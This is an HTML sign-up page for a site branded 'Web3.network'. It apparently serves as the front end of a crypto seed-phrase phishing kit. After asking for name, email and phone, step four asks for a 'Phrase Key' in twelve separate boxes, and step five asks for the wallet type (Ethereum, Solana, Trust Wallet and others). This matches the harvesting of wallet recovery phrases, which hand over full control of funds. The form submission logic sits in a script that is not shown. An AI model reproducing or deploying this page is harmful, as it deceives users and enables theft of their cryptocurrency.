<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Web3.network – Sign Up</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>

<div class="auth-container">

  <h1 class="logo">Web3.network</h1>
  <p class="tagline">Network</p>

  <form id="signupForm">

    <!-- STEP 1 -->
    <div class="step active">
      <h2>Your Name</h2>
      <input type="text" id="name" placeholder="Full name" required />
      <button type="button" onclick="nextStep()">Next</button>
    </div>

    <!-- STEP 2 -->
    <div class="step">
      <h2>Email Address</h2>
      <input type="email" id="email" placeholder="Email" required />
      <div class="nav-btns">
        <button type="button" onclick="prevStep()">Back</button>
        <button type="button" onclick="nextStep()">Next</button>
      </div>
    </div>

    <!-- STEP 3 -->
    <div class="step">
      <h2>Phone Number</h2>
      <input type="tel" id="phone" placeholder="Phone number" required />
      <div class="nav-btns">
        <button type="button" onclick="prevStep()">Back</button>
        <button type="button" onclick="nextStep()">Next</button>
      </div>
    </div>

    <!-- STEP 4 -->
    <div class="step">
      <h2>Phrase Key</h2>
      <div class="security-grid">
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
        <input maxlength="4" />
      </div>
      <div class="nav-btns">
        <button type="button" onclick="prevStep()">Back</button>
        <button type="button" onclick="nextStep()">Next</button>
      </div>
    </div>

    <!-- STEP 5 -->
    <div class="step">
      <h2>Wallet Type</h2>
      <select id="wallet">
        <option value="">Select wallet</option>
        <option>Ethereum</option>
        <option>Solana</option>
        <option>Trust Wallet</option>
        <option>Polygon</option>
        <option>Bitcoin</option>
      </select>
      <div class="nav-btns">
        <button type="button" onclick="prevStep()">Back</button>
        <button type="submit">Create Account</button>
      </div>
    </div>

  </form>

  <div id="loading" class="loading hidden">
    <p>Please hold on, your account is being created…</p>
  </div>

</div>

<script src="script.js"></script>
</body>
</html>
